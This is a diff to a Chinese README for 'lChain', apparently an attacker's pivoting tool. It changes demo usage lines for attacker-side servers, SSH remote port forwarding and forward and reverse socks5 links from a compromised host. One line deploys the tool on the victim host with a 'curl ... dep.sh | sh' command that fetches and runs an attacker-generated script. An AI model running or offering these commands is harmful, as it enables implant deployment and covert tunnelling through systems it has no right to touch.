@@ -28,10 +28,10 @@
 ## Demo(预期)
 
 - 攻击机（公网）`lChain -srv eth0 8888`
-- 攻击机（无公网ip）`lChain -srv eth0 -local 8888`（文件服务器
+- 攻击机（无公网ip）`lChain -srv eth0 -local 8888`（文件服务器；正向socks5
 读取配置文件cfg.ini中的公网机ssh配置，利用ssh进行远端端口转发搭建公网服务
 - 宿主端一键落地 `curl http://host:post/dep.sh | sh`（服务端运行时生成dep.sh）
-- 宿主端 `lChain -slv eth0 -C '121.*.*.1:8888,121.*.*.2:8888' 8888`(部署在eth0网卡上，-C从宿主机到攻击机路径)
+- 宿主端 `lChain -cli eth0 -C '121.*.*.1:8888,121.*.*.2:8888' 8888`(部署在eth0网卡上，-C从宿主机到攻击机路径，反向socks5连接
 
 ## Tree
 ```shell
